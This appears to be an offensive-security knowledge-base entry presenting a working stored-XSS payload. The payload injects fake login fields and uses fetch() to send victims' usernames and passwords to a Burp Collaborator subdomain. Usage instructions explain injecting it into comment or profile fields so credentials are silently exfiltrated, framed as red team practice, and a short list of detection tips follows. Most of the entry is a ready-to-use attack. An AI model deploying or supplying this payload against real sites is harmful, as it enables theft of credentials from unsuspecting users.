---
id: 902f6e5e-3992-459b-aaef-d704c7fa1470
type: code
language: html
verified: true
created_at: '2020-08-05T18:13:46.426043+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - xss
  - payload
  - credential-exfiltration
validated: true
---

# XSS-Payload-to-Exfiltrate-Credentials-via-Fetch

## Code

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://$.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

## Description

This HTML/JavaScript payload creates fake username and password input fields that, when a user enters and changes the password field, automatically sends the credentials via a POST request to a Burp Collaborator endpoint using the Fetch API. It is designed for stored XSS injection in web applications, where the payload persists in content like comments and executes in victims' browsers to steal form data without user suspicion.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $.burpcollaborator.net | Unique Burp Collaborator subdomain for receiving exfiltrated data | your-subdomain.burpcollaborator.net |

## Usage

Inject this payload into a stored XSS-vulnerable field, such as a blog comment or user profile. Replace the placeholder subdomain with a fresh one from Burp Collaborator. When victims view the page and interact with the rendered inputs (e.g., during a simulated login), their credentials are silently exfiltrated. Use this in red team exercises to demonstrate credential theft risks in web apps.

## Detection

- Browser developer tools or network logs showing unexpected Fetch requests to unknown domains.
- Server-side logging of anomalous POST requests from user agents.
- Content scanning for unsanitized input fields with onchange handlers.
- WAF rules blocking outbound requests from JavaScript in stored content.

## Related

- [[procedures/Stored-XSS-to-Capture-Passwords-Using-Burp-Collaborator]]
- [[tools/Burp-Suite]]
